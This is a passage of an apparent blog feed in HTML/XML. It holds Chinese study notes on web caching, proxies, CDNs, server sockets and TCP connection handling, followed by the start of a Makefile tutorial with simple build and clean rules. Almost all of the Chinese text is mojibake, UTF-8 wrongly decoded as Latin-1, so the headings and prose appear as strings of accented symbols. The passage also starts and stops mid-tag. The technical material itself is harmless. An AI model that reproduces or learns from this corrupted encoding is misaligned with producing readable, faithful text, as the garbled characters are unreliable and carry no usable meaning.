href="#ä½¿ç”¨ç¼“å­˜æœåŠ¡å™¨åˆ†æ‹…è´Ÿè½½" class="headerlink" title="ä½¿ç”¨ç¼“å­˜æœåŠ¡å™¨åˆ†æ‹…è´Ÿè½½"></a>ä½¿ç”¨ç¼“å­˜æœåŠ¡å™¨åˆ†æ‹…è´Ÿè½½</h4><p>å°†æ•´ä¸ªç³»ç»ŸæŒ‰åŠŸèƒ½åˆ†æˆä¸åŒçš„æœåŠ¡å™¨ã€‚</p><p>ç”¨æˆ·å‘ç¼“å­˜æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œç¼“å­˜æœåŠ¡å™¨å°†è¯·æ±‚ä¿å­˜åœ¨ç¼“å­˜ä¸­ã€‚</p><p>Viaå­—æ®µã€‚</p><p>è¿”å›å“åº”æ—¶å¯æ ¹æ®è¯·æ±‚æ¶ˆæ¯ä¸­URLçš„ç›®å½•ååˆ¤æ–­ã€‚</p><p>æ•°æ®ç§¯ç´¯ã€‚</p><p>å¦‚æœè¯·æ±‚å†…å®¹åœ¨ç¼“å­˜ä¸­å­˜åœ¨ï¼Œè¿”å›If-Moifiedâ€”Sinceå¤´éƒ¨å­—æ®µï¼Œå…¶ä¸­åŠ ä¸Šä¸Šæ¬¡ä¿å­˜çš„æ—¶é—´ï¼Œè¯¢é—®WebæœåŠ¡å™¨åœ¨è¿™ä¸ªæ—¶é—´ä¹‹åæ•°æ®æœ‰æ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚</p><h4 id="ä»£ç†çš„åŸºæœ¬åŸç†"><a href="#ä»£ç†çš„åŸºæœ¬åŸç†" class="headerlink" title="ä»£ç†çš„åŸºæœ¬åŸç†"></a>ä»£ç†çš„åŸºæœ¬åŸç†</h4><p>åœ¨å®¢æˆ·ç«¯å’ŒWebæœåŠ¡å™¨ä¹‹é—´å……å½“ä¸­é—´äººçš„æ–¹å¼å°±æ˜¯ä»£ç†çš„åŸºæœ¬åŸç†ã€‚</p><h4 id="æ­£å‘ä»£ç†"><a href="#æ­£å‘ä»£ç†" class="headerlink" title="æ­£å‘ä»£ç†"></a>æ­£å‘ä»£ç†</h4><p>forward proxyã€‚<br>åœ¨å®¢æˆ·ç«¯ä¸€ä¾§éƒ¨ç½²ç¼“å­˜æœåŠ¡å™¨ã€‚</p><p>å¯ç”¨æ¥å®ç°é˜²ç«å¢™ã€‚ä»£ç†å¯ä»¥æŸ¥çœ‹è¯·æ±‚çš„å†…å®¹ã€‚</p><p>è®¿é—®è¿‡çš„æ•°æ®ä¼šè¢«ç¼“å­˜ã€‚</p><p>åœ¨å®¢æˆ·ç«¯è®¾ç½®äº†ä»£ç†ï¼Œä¼šåœ¨URIéƒ¨åˆ†å¡«å†™å®Œæ•´çš„ç½‘å€ã€‚</p><p>ä½¿ç”¨æ­£å‘ä»£ç†éœ€è¦åœ¨æµè§ˆå™¨ä¸­è®¾ç½®ã€‚</p><h4 id="åå‘ä»£ç†"><a href="#åå‘ä»£ç†" class="headerlink" title="åå‘ä»£ç†"></a>åå‘ä»£ç†</h4><p>reverse proxyã€‚<br>ç±»ä¼¼äºæœåŠ¡å™¨ç«¯çš„ç¼“å­˜æœåŠ¡å™¨ã€‚<br>æ­£å‘ä»£ç†çš„æ”¹è‰¯ç‰ˆã€‚</p><h4 id="é€æ˜ä»£ç†"><a href="#é€æ˜ä»£ç†" class="headerlink" title="é€æ˜ä»£ç†"></a>é€æ˜ä»£ç†</h4><p>transparent proxyã€‚<br>ä½äºè¯·æ±‚æ¶ˆæ¯ä»æµè§ˆå™¨ä¼ è¾“åˆ°WebæœåŠ¡å™¨çš„è·¯å¾„ä¸­ï¼Œå½“æ¶ˆæ¯ç»è¿‡æ—¶è¿›è¡Œæ‹¦æˆªã€‚</p><p>å®¢æˆ·ç«¯å¤„çš„ç¼“å­˜æœåŠ¡å™¨ï¼š</p><ul><li>é™ä½æµé‡æ¶ˆè€—</li><li>é¿å…æ‹¥å µç‚¹</li></ul><h3 id="å†…å®¹åˆ†å‘æœåŠ¡"><a href="#å†…å®¹åˆ†å‘æœåŠ¡" class="headerlink" title="å†…å®¹åˆ†å‘æœåŠ¡"></a>å†…å®¹åˆ†å‘æœåŠ¡</h3><p>CDSï¼ŒContent Delivery Serviceã€‚æˆ–CDNï¼ŒContent Delivery Network or Content Distribution Networkã€‚</p><p>æä¾›è¿™ç§æœåŠ¡çš„å‚å•†å«CDSNï¼ŒContent Delivery Service Providerã€‚</p><p>è¯¥æœåŠ¡æ—¶å°†WebæœåŠ¡å™¨å¯ä»¥æ§åˆ¶çš„ç¼“å­˜æœåŠ¡å™¨æ”¾åœ¨å®¢æˆ·ç«¯çš„è¿è¥å•†å¤„ã€‚</p><h4 id="è®©å®¢æˆ·ç«¯æ‰¾åˆ°æœ€è¿‘çš„ç¼“å­˜æœåŠ¡å™¨"><a href="#è®©å®¢æˆ·ç«¯æ‰¾åˆ°æœ€è¿‘çš„ç¼“å­˜æœåŠ¡å™¨" class="headerlink" title="è®©å®¢æˆ·ç«¯æ‰¾åˆ°æœ€è¿‘çš„ç¼“å­˜æœåŠ¡å™¨"></a>è®©å®¢æˆ·ç«¯æ‰¾åˆ°æœ€è¿‘çš„ç¼“å­˜æœåŠ¡å™¨</h4><hr><p>ç°åœ¨çš„å±€åŸŸç½‘ç”¨å…‰çº¤è¿æ¥ï¼ŒèŒƒå›´å¯ä»¥å¾ˆå¤§ä¸”é€Ÿåº¦å¿«ã€‚</p><h2 id="ç¬¬å…­ç« "><a href="#ç¬¬å…­ç« " class="headerlink" title="ç¬¬å…­ç« "></a>ç¬¬å…­ç« </h2><p>è·¯ç”±å™¨å’Œäº¤æ¢æœºä¸è€ƒè™‘è¯·æ±‚åŒ…å’Œå“åº”åŒ…ä¹‹é—´çš„å…³è”ã€‚</p><p>ä¸€å°æœåŠ¡å™¨ä¸Šå¯ä»¥è¿è¡Œå¤šä¸ªæœåŠ¡å™¨ç¨‹åºã€‚</p><h3 id="æœåŠ¡å™¨ç¨‹åºçš„ç»“æ„"><a href="#æœåŠ¡å™¨ç¨‹åºçš„ç»“æ„" class="headerlink" title="æœåŠ¡å™¨ç¨‹åºçš„ç»“æ„"></a>æœåŠ¡å™¨ç¨‹åºçš„ç»“æ„</h3><p>æ¯æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥è¿›æ¥ï¼Œå°±å¯åŠ¨ä¸€ä¸ªæ–°çš„æœåŠ¡å™¨ç¨‹åºï¼Œç¡®ä¿æœåŠ¡å™¨ç¨‹åºå’Œå®¢æˆ·ç«¯æ˜¯ä¸€å¯¹ä¸€çš„çŠ¶æ€ã€‚</p><p>æœåŠ¡å™¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œè¯»é…ç½®æ–‡ä»¶å®Œæˆåˆå§‹åŒ–ã€‚</p><p>ç¨‹åºåˆ†ä¸ºä¸¤ä¸ªæ¨¡å—ï¼š</p><ul><li>ç­‰å¾…è¿æ¥æ¨¡å—</li><li>è´Ÿè´£ä¸å®¢æˆ·ç«¯é€šä¿¡çš„æ¨¡å—</li></ul><p>å¤šä»»åŠ¡ï¼Œä¹Ÿå¯ç§°ä¸ºå¤šè¿›ç¨‹ï¼Œå¹¶å‘ï¼Œå°±æ˜¯ä¸€ä¸ªå¤„ç†å™¨åœ¨å¤šä¸ªç¨‹åºä¹‹é—´å¿«é€Ÿåˆ‡æ¢ã€‚</p><h3 id="å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„åŒºåˆ«"><a href="#å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„åŒºåˆ«" class="headerlink" title="å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„åŒºåˆ«"></a>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„åŒºåˆ«</h3><p>ç¡¬ä»¶éƒ¨åˆ†æœ‰æ‰€ä¸åŒï¼Œç½‘ç»œç›¸å…³éƒ¨åˆ†å¦‚ç½‘å¡ã€åè®®æ ˆç­‰çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½†ç”¨æ³•ä¸Šæœ‰å·®å¼‚ã€‚</p><hr><p>è¿æ¥æ— æ³•å•æ–¹é¢è¿æ¥ï¼Œéœ€è¦æœ‰ä¸€æ–¹ç­‰å¾…è¿æ¥ï¼Œå¦ä¸€æ–¹æ‰èƒ½å‘èµ·è¿æ¥ã€‚</p><p>å®¢æˆ·ç«¯å‘èµ·è¿æ¥æ—¶ï¼Œè¦æŒ‡å®šæœåŠ¡å™¨ç«¯çš„ç«¯å£å·ã€‚</p><h3 id="é€šä¿¡æ“ä½œ"><a href="#é€šä¿¡æ“ä½œ" class="headerlink" title="é€šä¿¡æ“ä½œ"></a>é€šä¿¡æ“ä½œ</h3><h4 id="å¥—æ¥å­—-1"><a href="#å¥—æ¥å­—-1" class="headerlink" title="å¥—æ¥å­—"></a>å¥—æ¥å­—</h4><p>è°ƒç”¨listenå‘å¥—æ¥å­—å†™å…¥ç­‰å¾…ä¿¡æ¯ï¼Œæ‰§è¡Œacceptæ—¶ï¼ŒæœåŠ¡å™¨ç«¯ä¸€èˆ¬éƒ½å¤„äºåŒ…ç­‰å¾…çŠ¶æ€ã€‚è¿æ¥æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªç­‰å¾…è¿æ¥çš„å¥—æ¥å­—çš„å‰¯æœ¬ï¼Œå†™å…¥è¿æ¥å¯¹è±¡ç­‰æ§åˆ¶ä¿¡æ¯ï¼Œå¹¶ä¸å®¢æˆ·ç«¯å¥—æ¥å­—è¿æ¥åœ¨ä¸€èµ·ã€‚</p><p>å¤åˆ¶å‡ºä¸€ä¸ªæ–°å¥—æ¥å­—ä¹‹åï¼ŒåŸæ¥é‚£ä¸ªå¤„äºç­‰å¾…çŠ¶æ€çš„å¥—æ¥å­—è¿˜ä¼šä»¥ç­‰å¾…çŠ¶æ€ç»§ç»­å­˜åœ¨ã€‚</p><p>å…³é”®ç‚¹å°±æ˜¯æ¯æ¬¡ä¸ºæ–°çš„è¿æ¥åˆ›å»ºæ–°çš„å¥—æ¥å­—ã€‚</p><p>ç«¯å£å·æ˜¯ç”¨æ¥è¯†åˆ«å¥—æ¥å­—çš„ï¼Œæ–°åˆ›å»ºçš„å¥—æ¥å­—å‰¯æœ¬å¿…éœ€å’ŒåŸæ¥ç­‰å¾…è¿æ¥çš„å¥—æ¥å­—å…·æœ‰ç›¸åŒçš„ç«¯å£å·ã€‚</p><p>ä»¥ä¸‹å››ç§ä¿¡æ¯åˆ¤æ–­å¥—æ¥å­—ï¼š</p><ul><li>å®¢æˆ·ç«¯IPåœ°å€</li><li>å®¢æˆ·ç«¯ç«¯å£å·</li><li>æœåŠ¡å™¨IPåœ°å€</li><li>æœåŠ¡å™¨ç«¯å£å·</li></ul><p>å¥—æ¥å­—ä¸­è®°å½•äº†å½“å‰æ—¶é—´ç‚¹å“ªä¸ªç¨‹åºæ­£åœ¨ä¸å“ªä¸ªå¯¹è±¡è¿›è¡Œé€šä¿¡ã€‚</p><p>åº”ç”¨ç¨‹åºä¹‹é—´ä½¿ç”¨æè¿°ç¬¦æ¥æŒ‡ä»£å¥—æ¥å­—ã€‚</p><p>ä½¿ç”¨æè¿°ç¬¦æ¥æŒ‡ä»£å¥—æ¥å­—çš„åŸå› ï¼š</p><ul><li>ç­‰å¾…è¿æ¥çš„å¥—æ¥å­—ä¸­æ²¡æœ‰å®¢æˆ·ç«¯çš„IPåœ°å€å’Œç«¯å£å·</li><li>ä½¿ç”¨æè¿°ç¬¦è¿™ä¸€ä¿¡æ¯æ¯”è¾ƒç®€å•</li></ul><h4 id="å…‰ç”µä¿¡å·è½¬æ¢ä¸ºæ•°å­—ä¿¡å·"><a href="#å…‰ç”µä¿¡å·è½¬æ¢ä¸ºæ•°å­—ä¿¡å·" class="headerlink" title="å…‰ç”µä¿¡å·è½¬æ¢ä¸ºæ•°å­—ä¿¡å·"></a>å…‰ç”µä¿¡å·è½¬æ¢ä¸ºæ•°å­—ä¿¡å·</h4><p>ç”µä¿¡å·å’Œå…‰ä¿¡å·è½¬æ¢ä¸ºæ•°å­—ä¿¡å·ï¼š</p><ol><li>æ£€æµ‹åŒæ­¥ä¿¡å·</li><li>å»¶é•¿æ—¶é’Ÿä¿¡å·</li><li>åˆ†ç¦»æ—¶é’Ÿä¿¡å·</li></ol><h4 id="IPæ¨¡å—å¤„ç†æ•°æ®åŒ…"><a href="#IPæ¨¡å—å¤„ç†æ•°æ®åŒ…" class="headerlink" title="IPæ¨¡å—å¤„ç†æ•°æ®åŒ…"></a>IPæ¨¡å—å¤„ç†æ•°æ®åŒ…</h4><p>åè®®æ ˆçš„IPæ¨¡å—ä¼šæ£€æŸ¥IPå¤´éƒ¨ï¼š</p><ol><li>åˆ¤æ–­æ˜¯ä¸æ˜¯å‘ç»™è‡ªå·±çš„</li><li>åˆ¤æ–­ç½‘ç»œåŒ…æœ‰æ²¡æœ‰åˆ†ç‰‡</li><li>å°†åŒ…è½¬å‘ç»™TCPæˆ–UTPæ¨¡å—</li></ol><h4 id="TCPæ¨¡å—å¤„ç†æ•°æ®åŒ…"><a href="#TCPæ¨¡å—å¤„ç†æ•°æ®åŒ…" class="headerlink" title="TCPæ¨¡å—å¤„ç†æ•°æ®åŒ…"></a>TCPæ¨¡å—å¤„ç†æ•°æ®åŒ…</h4><p>å¦‚æœæ”¶åˆ°çš„æ˜¯å‘èµ·è¿æ¥çš„åŒ…ï¼Œåˆ™TCPæ¨¡å—ä¼šï¼š</p><ol><li>ç¡®è®¤TCPå¤´éƒ¨çš„æ§åˆ¶ä½SYN</li><li>æ£€æŸ¥æ¥æ”¶æ–¹çš„ç«¯å£å·</li><li>ä¸ºç›¸åº”çš„ç­‰å¾…è¿æ¥çš„å¥—æ¥å­—å¤åˆ¶ä¸€ä¸ªæ–°çš„å‰¯æœ¬</li><li>è®°å½•å‘é€æ–¹çš„IPåœ°å€å’Œç«¯å£å·ç­‰ä¿¡æ¯ã€‚</li></ol><p>æ”¶åˆ°æ•°æ®åŒ…ï¼š</p><ol><li>æ ¹æ®æ”¶åˆ°çš„åŒ…çš„å‘é€æ–¹çš„IPåœ°å€ã€å‘é€æ–¹ç«¯å£å·ã€æ¥æ”¶æ–¹IPåœ°å€ã€æ¥æ”¶æ–¹ç«¯å£å·æ‰¾åˆ°ç›¸åº”çš„å¥—æ¥å­—</li><li>å°†æ•°æ®å—æ‹¼åˆèµ·æ¥å¹¶ä¿å­˜åœ¨æ¥å—ç¼“å­˜åŒº</li><li>æƒ³å®¢æˆ·ç«¯è¿”å›ä»–ACKå·</li></ol><p>æ–­å¼€è¿æ¥ï¼Œä¸¤è¾¹éƒ½å¯ä»¥å‘èµ·ï¼Œè¿™é‡Œä¸ºæœåŠ¡å™¨ç«¯ï¼š</p><ol><li>è°ƒç”¨Socketåº“çš„closeï¼ŒTCPç”ŸæˆFINä¸º1çš„å¤´éƒ¨</li><li>å®¢æˆ·ç«¯æ¥æ”¶åè¿”å›ä¸€ä¸ªACKï¼Œç„¶åè°ƒç”¨closeï¼Œç”ŸæˆFINä¸º1çš„TCPå¤´éƒ¨å‘é€ç»™æœåŠ¡å™¨</li><li>æœåŠ¡å™¨è¿”å›ACK</li></ol><h3 id="WebæœåŠ¡å™¨ç¨‹åºè§£é‡Šè¯·æ±‚æ¶ˆæ¯å¹¶åšå‡ºå“åº”"><a href="#WebæœåŠ¡å™¨ç¨‹åºè§£é‡Šè¯·æ±‚æ¶ˆæ¯å¹¶åšå‡ºå“åº”" class="headerlink" title="WebæœåŠ¡å™¨ç¨‹åºè§£é‡Šè¯·æ±‚æ¶ˆæ¯å¹¶åšå‡ºå“åº”"></a>WebæœåŠ¡å™¨ç¨‹åºè§£é‡Šè¯·æ±‚æ¶ˆæ¯å¹¶åšå‡ºå“åº”</h3><p>WebæœåŠ¡å™¨å…¬å¼€çš„ç›®å½•æ˜¯è™šæ‹Ÿç›®å½•ã€‚</p><p>æ–‡ä»¶åè½¬æ¢ã€‚</p><h4 id="è®¿é—®æ§åˆ¶"><a href="#è®¿é—®æ§åˆ¶" class="headerlink" title="è®¿é—®æ§åˆ¶"></a>è®¿é—®æ§åˆ¶</h4><p>å¸¸ç”¨åœ¨ä¼šå‘˜åˆ¶çš„ä¿¡æ¯æœåŠ¡ã€‚<br>ä¸»è¦æœ‰ä»¥ä¸‹3ç§ï¼š</p><ul><li>å®¢æˆ·ç«¯IPåœ°å€</li><li>å®¢æˆ·ç«¯åŸŸå</li><li>ç”¨æˆ·åå’Œå¯†ç </li></ul><p>æŸ¥è¯¢åŸŸåï¼š</p><ol><li>åè®®æ ˆå°†å‘é€æ–¹çš„IPå‘ŠçŸ¥ç»™WebæœåŠ¡å™¨</li><li>æœåŠ¡å™¨ç”ŸæˆæŸ¥è¯¢æ¶ˆæ¯åˆ°æœ€è¿‘çš„DNSæœåŠ¡å™¨</li><li>DNSæœåŠ¡å™¨æ‰¾å‡ºè´Ÿè´£ç®¡è¾–è¯¥IPçš„DNSæœåŠ¡å™¨å¹¶è½¬å‘æŸ¥è¯¢æ¶ˆæ¯</li><li>DNSæœåŠ¡å™¨è¿”å›æŸ¥è¯¢åˆ°çš„åŸŸå</li></ol><h4 id="è¿”å›å“åº”"><a href="#è¿”å›å“åº”" class="headerlink" title="è¿”å›å“åº”"></a>è¿”å›å“åº”</h4><p>è°ƒç”¨Socketåº“çš„writeï¼Œå°†å“åº”æ¶ˆæ¯äº¤ç»™åè®®æ ˆï¼Œå¹¶é€šè¿‡ä½¿ç”¨å¥—æ¥å­—æè¿°ç¬¦å‘ŠçŸ¥è¿™ä¸ªæ¶ˆæ¯è¯¥å‘é€ç»™è°ã€‚</p><h5 id="åˆ¤æ–­æ˜¾ç¤ºçš„æ•°æ®ç±»å‹å’Œç¼–ç æ–¹å¼"><a href="#åˆ¤æ–­æ˜¾ç¤ºçš„æ•°æ®ç±»å‹å’Œç¼–ç æ–¹å¼" class="headerlink" title="åˆ¤æ–­æ˜¾ç¤ºçš„æ•°æ®ç±»å‹å’Œç¼–ç æ–¹å¼"></a>åˆ¤æ–­æ˜¾ç¤ºçš„æ•°æ®ç±»å‹å’Œç¼–ç æ–¹å¼</h5><p>Content-Typeç±»å‹</p><p><img src="/media/16523998935740.png"></p><p>charsetè¡¨ç¤ºç¼–ç æ–¹å¼ã€‚</p><p>Content-Encodingï¼Œè½¬æ¢æ–¹å¼ã€‚</p><h4 id="æµè§ˆå™¨æ˜¾ç¤ºå†…å®¹"><a href="#æµè§ˆå™¨æ˜¾ç¤ºå†…å®¹" class="headerlink" title="æµè§ˆå™¨æ˜¾ç¤ºå†…å®¹"></a>æµè§ˆå™¨æ˜¾ç¤ºå†…å®¹</h4><p>å®é™…çš„æ˜¾ç¤ºæ“ä½œæ˜¯ç”±æ“ä½œç³»ç»Ÿæ¥å®Œæˆçš„ï¼Œæµè§ˆå™¨è´Ÿè´£å¯¹æ“ä½œç³»ç»Ÿå‘å‡ºæŒ‡ä»¤ã€‚</p><h1 id="æ•´ä½“å›¾"><a href="#æ•´ä½“å›¾" class="headerlink" title="æ•´ä½“å›¾"></a>æ•´ä½“å›¾</h1><p><img src="/media/16524182951589.png"></p><p><img src="/media/16524182951170.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è·Ÿæˆ‘ä¸€èµ·å†™ Makefile</title>
    <link href="/2022/08/25/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99%20Makefile/"/>
    <url>/2022/08/25/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99%20Makefile/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1 æ¦‚è¿°"></a>1 æ¦‚è¿°</h2><p>makefileå¯ä»¥æŒ‡å®šé‚£äº›æ–‡ä»¶éœ€è¦å…ˆç¼–è¯‘ï¼Œé‚£äº›æ–‡ä»¶éœ€è¦åç¼–è¯‘ï¼Œé‚£äº›æ–‡ä»¶éœ€è¦é‡æ–°ç¼–è¯‘ã€‚</p><p>makefileåƒshellè„šæœ¬ï¼Œå¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„å‘½ä»¤ã€‚</p><p>ä½œç”¨ï¼šè‡ªåŠ¨åŒ–ç¼–è¯‘ã€‚</p><p>makeæ˜¯ä¸€ä¸ªå‘½ä»¤å·¥å…·ï¼Œç”¨æ¥è§£é‡Šmakefileä¸­çš„æŒ‡ä»¤ã€‚</p><hr><h2 id="2-ä»‹ç»"><a href="#2-ä»‹ç»" class="headerlink" title="2 ä»‹ç»"></a>2 ä»‹ç»</h2><p>makeçš„ç¼–è¯‘è§„åˆ™ï¼Œä»¥cæ–‡ä»¶å’Œå¤´æ–‡ä»¶ä¸ºä¾‹ï¼š</p><ol><li>è‹¥è¿™ä¸ªå·¥ç¨‹æ²¡æœ‰ç¼–è¯‘è¿‡ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„cæ–‡ä»¶éƒ½è¦ç¼–è¯‘å¹¶è¢«é“¾æ¥ã€‚</li><li>è‹¥è¿™ä¸ªå·¥ç¨‹çš„æŸå‡ ä¸ªcæ–‡ä»¶è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆåªç¼–è¯‘è¢«ä¿®æ”¹çš„cæ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åºã€‚</li><li>è‹¥è¿™ä¸ªå·¥ç¨‹ä¸­çš„å¤´æ–‡ä»¶è¢«æ”¹å˜äº†ï¼Œé‚£ä¹ˆéœ€è¦ç¼–è¯‘å¼•ç”¨äº†è¿™å‡ ä¸ªå¤´æ–‡ä»¶çš„cæ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åºã€‚</li></ol><hr><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><pre><code class="hljs">target ...: prerequisites    command    </code></pre><p>commandå‰ä¸€å®šè¦ä»¥ä¸€ä¸ª<mark>tabé”®å¼€å¤´</mark>ã€‚</p><p>targetæ˜¯ç›®æ ‡æ–‡ä»¶ï¼Œprerequisitesæ˜¯æºæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„ä¾èµ–æ–‡ä»¶ï¼Œcommandå°±æ˜¯shellå‘½ä»¤ï¼Œå°±æ˜¯åœ¨å‘½ä»¤è¡Œä¸­ç¼–è¯‘çš„é‚£ä¸€å¥—å‘½ä»¤ã€‚</p><p>åŸºæœ¬è§„åˆ™å°±æ˜¯ï¼Œå½“prerequisitesç›¸è¾ƒäºtargetæ›´æ–°æ—¶ï¼Œæ‰§è¡Œcommandã€‚</p><hr><h3 id="åˆ¤æ–­æ›´æ–°çš„åŸç†"><a href="#åˆ¤æ–­æ›´æ–°çš„åŸç†" class="headerlink" title="åˆ¤æ–­æ›´æ–°çš„åŸç†"></a>åˆ¤æ–­æ›´æ–°çš„åŸç†</h3><p>é€šè¿‡æ¯”è¾ƒtargetæ–‡ä»¶å’Œprerequisitesæ–‡ä»¶çš„<mark>ä¿®æ”¹æ—¥æœŸ</mark>ï¼Œæ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œcommandã€‚</p><hr><h3 id="ä¾èµ–å…³ç³»çš„å®è´¨"><a href="#ä¾èµ–å…³ç³»çš„å®è´¨" class="headerlink" title="ä¾èµ–å…³ç³»çš„å®è´¨"></a>ä¾èµ–å…³ç³»çš„å®è´¨</h3><p>è¯´æ˜ç›®æ ‡æ–‡ä»¶æ˜¯ç”±é‚£äº›æ–‡ä»¶ç”Ÿæˆçš„ã€‚</p><hr><h3 id="å®šä¹‰å‘½ä»¤"><a href="#å®šä¹‰å‘½ä»¤" class="headerlink" title="å®šä¹‰å‘½ä»¤"></a>å®šä¹‰å‘½ä»¤</h3><p>åœ¨targetåé¢æ²¡æœ‰prerequisitesï¼Œä¹Ÿå°±æ˜¯å†’å·ä¹‹åä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚</p><p>è¦æ‰§è¡Œå‘½ä»¤ï¼Œå°±éœ€è¦æ˜¾ç¤ºçš„ä½¿ç”¨<code>make label</code>, å¦‚</p><pre><code class="hljs">clean :    rm edit main.o kid.o    </code></pre><p>å°±éœ€è¦ç”¨<code>make clean</code>æ¥æ‰§è¡Œã€‚</p><hr><h3 id="å¦‚ä½•å·¥ä½œ"><a href="#å¦‚ä½•å·¥ä½œ" class="headerlink" title="å¦‚ä½•å·¥ä½œ"></a>å¦‚ä½•å·¥ä½œ</h3><ol><li>åœ¨å½“å‰ç›®å½•ä¸‹å¯»æ‰¾<code>makefile</code>æˆ–<code>Makefile</code>æ–‡ä»¶ã€‚</li><li>ä»¥æ–‡ä»¶ä¸­çš„ç¬¬ä¸€ä¸ªtargetä¸ºæœ€ç»ˆçš„ç›®æ ‡æ–‡ä»¶ã€‚</li><li>å¦‚æœeditæ–‡ä»¶ä¸å­˜åœ¨ï¼Œæˆ–æ˜¯åé¢çš„ä¾èµ–ä¿®æ”¹æ—¶é—´æ›´æ–°ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œå‘½ä»¤</li><li>å¦‚æœeditæ–‡ä»¶çš„ä¾èµ–ä¸å­˜åœ¨ï¼Œå°±ä¼šå¯»æ‰¾ä¾èµ–å¹¶ç”Ÿæˆ<br>â€¦</li></ol><hr><h3 id="åœ¨makefileä¸­ä½¿ç”¨å˜é‡"><a href="#åœ¨makefileä¸­ä½¿ç”¨å˜é‡" class="headerlink" title="åœ¨makefileä¸­ä½¿ç”¨å˜é‡"></a>åœ¨makefileä¸­ä½¿ç”¨å˜é‡</h3><p>ä½œç”¨ï¼šä¾¿äºç»´æŠ¤ï¼Œåªéœ€è¦ä¿®æ”¹ä¸€ä¸ªåœ°æ–¹ï¼Œå°±å¯ä»¥æŠŠæ–‡ä»¶ä¸­æ‰€æœ‰ä½¿ç”¨åˆ°è¯¥å˜é‡çš„å€¼ä¿®æ”¹ã€‚</p><p>å¦‚åœ¨makefileä¸­ä¸€å¼€å§‹å®šä¹‰ï¼š</p><pre><code class="hljs">objects = main.o kid.o command.o</code></pre><p>å’Œå…¶ä»–è¯­è¨€ä¸­çš„å˜é‡æœ‰äº›è®¸ä¸ä¸€æ ·ã€‚</p><p>ä½¿ç”¨</p><pre><code class="hljs">edit : $(objects)    cc -o edit $(objects)clean :    rm edit $(objects)    </code></pre><hr><h3 id="åˆ©ç”¨makeçš„è‡ªåŠ¨æ¨å¯¼åŠŸèƒ½"><a href="#åˆ©ç”¨makeçš„è‡ªåŠ¨æ¨å¯¼åŠŸèƒ½" class="headerlink" title="åˆ©ç”¨makeçš„è‡ªåŠ¨æ¨å¯¼åŠŸèƒ½"></a>åˆ©ç”¨makeçš„è‡ªåŠ¨æ¨å¯¼åŠŸèƒ½</h3><pre><code class="hljs">main.o : defy.h</code></pre><p>ä¼šè‡ªåŠ¨æŠŠ<code>main.c</code>å†™è¿›ä¾èµ–ï¼Œå¹¶è‡ªåŠ¨æ¨å¯¼å‡º<code>cc -c main.c</code>.</p><p>å‘ç°å¤´æ–‡ä»¶å¹¶ä¸éœ€è¦å†™åˆ°commandä¸­ï¼Œåº”è¯¥æ˜¯å› ä¸ºå¤´æ–‡ä»¶ä¼šåœ¨cæ–‡ä»¶ä¸­å±•å¼€ã€‚</p><hr><h3 id="ç”¨äºæ¸…ç©ºç›®æ ‡æ–‡ä»¶çš„è§„åˆ™"><a href="#ç”¨äºæ¸…ç©ºç›®æ ‡æ–‡ä»¶çš„è§„åˆ™" class="headerlink" title="ç”¨äºæ¸…ç©ºç›®æ ‡æ–‡ä»¶çš„è§„åˆ™"></a>ç”¨äºæ¸…ç©ºç›®æ ‡æ–‡ä»¶çš„è§„åˆ™</h3><p>æ¯ä¸€ä¸ªMakefileä¸­éƒ½åº”è¯¥å†™ä¸€ä¸ªæ¸…ç©ºç›®æ ‡æ–‡ä»¶çš„è§„åˆ™ã€‚</p><pre><code class="hljs">.PHONY : cleanclean :    -rm edit $(objects)    </code></pre><p><code>.PHONY</code>è¡¨ç¤º<code>clean</code>æ˜¯ä¸€ä¸ªâ€œä¼ªç›®æ ‡â€ã€‚</p><p>æœ‰ä¸€ä¸ªå‡å·<code>-</code>è¡¨ç¤ºï¼Œå½“æŸäº›æ–‡ä»¶å‡ºç°é—®é¢˜æ—¶ï¼Œç»§ç»­å®Œæˆåé¢çš„äº‹ã€‚</p><p>cleanä¸€èˆ¬æ”¾åœ¨æ–‡ä»¶çš„æœ€åã€‚</p><hr><h3 id="Makefileç»„æˆ"><a href="#Makefileç»„æˆ" class="headerlink" 